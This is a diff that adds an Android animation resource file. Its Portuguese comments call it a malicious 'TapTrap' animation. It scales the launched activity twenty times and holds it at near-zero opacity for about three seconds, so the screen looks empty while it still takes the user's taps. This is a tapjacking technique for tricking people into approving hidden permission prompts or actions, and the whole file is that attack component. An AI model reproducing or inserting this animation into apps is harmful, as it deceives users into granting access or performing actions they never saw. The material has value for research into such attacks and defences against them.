@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Animação TapTrap maliciosa - torna atividade invisível mas funcional -->
+<set xmlns:android="http://schemas.android.com/apk/res/android">
+    <!-- Escalar para tamanho invisível mas mantém área clicável -->
+    <scale
+        android:fromXScale="20"
+        android:toXScale="20"
+        android:fromYScale="20"
+        android:toYScale="20"
+        android:pivotX="50%"
+        android:pivotY="50%"
+        android:repeatCount="1"
+        android:duration="2999" />
+    <!-- Tornar completamente transparente -->
+    <alpha
+        android:fromAlpha="0.001"
+        android:toAlpha="0.001"
+        android:repeatCount="1"
+        android:duration="2999" />
+    <!-- Mover para posição específica onde o usuário vai clicar -->
+    <translate
+        android:fromXDelta="0%"
+        android:toXDelta="0%"
+        android:fromYDelta="0%"
+        android:toYDelta="0%"
+        android:duration="2999" />
+</set>
